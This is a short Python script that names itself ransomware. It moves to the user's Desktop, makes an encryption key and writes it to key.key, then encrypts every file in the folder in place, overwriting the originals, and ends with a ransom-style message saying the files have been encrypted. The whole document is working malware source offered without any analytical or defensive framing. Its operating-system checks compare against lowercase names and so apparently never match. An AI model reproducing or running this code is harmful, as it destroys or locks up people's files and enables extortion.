from cryptography.fernet import Fernet
import os
import platform
import getpass

username = getpass.getuser()

operating = platform.system()

if operating == "linux":
    os.chdir(f"/home/{username}/Desktop")
elif operating == "windows":
    os.chdir(f"C:/Users/{username}/Desktop")

key = Fernet.generate_key()     # create a fernet key
print(key)      # print it (for safety backup)
f = Fernet(key)         # generate an item "f"
with open("key.key", "wb") as keyw:     #create a key file (for decryption backup)
    keyw.write(key)
files = []          # files list


for file in os.listdir():               # look trough all of the files in the current directory

    if file == "ransomware.py" or file == "key.key":        #check if the filename is the ransomware script or the key
        continue
                                                    
    if os.path.isdir(file):             # if its a directory skip it
        continue

    else:
        files.append(file)              #if its a file append it to the files list

for file in files:                  # go trough each file

    with open(file, "rb") as text:          # read the data in binary
        data = text.read()

    enc_data = f.encrypt(data)          # create an encrypted version

    with open(file, "wb") as text:      # replace the file content with encrypted version
        text.write(enc_data)

print("Your files have been encrypted!")        #display ransom note
